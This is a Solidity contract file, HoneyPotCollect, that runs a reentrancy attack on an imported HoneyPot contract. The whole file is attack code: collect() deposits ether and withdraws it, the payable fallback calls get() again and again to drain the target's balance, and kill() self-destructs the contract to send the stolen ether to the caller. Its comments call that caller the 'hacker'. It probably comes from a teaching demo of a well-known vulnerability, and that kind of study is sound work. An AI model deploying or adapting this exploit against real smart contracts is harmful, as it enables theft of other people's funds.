pragma solidity ^0.4.4;

import "./HoneyPot.sol";

contract HoneyPotCollect {
  HoneyPot public honeypot;
  function HoneyPotCollect (address _honeypot) public {
    // pass an address will be the HoneyPot
    honeypot = HoneyPot(_honeypot);
  }

  // to get the collected ether to an address of hacker
  // mechanism to destroy the HoneyPotCollect and send all ether containing in it to the address
  function kill () public {
    selfdestruct(msg.sender);
  }


  // set the reentrancy attack in motion. It puts some ether in HoneyPot
  function collect() payable public {
    honeypot.put.value(msg.value)();
    honeypot.get();
  }


  // the fallback function is called whenever the HoneyPotCollect contract receives ether
  function () payable public {
    if (honeypot.balance >= msg.value) {
      honeypot.get();
    }
  }
}
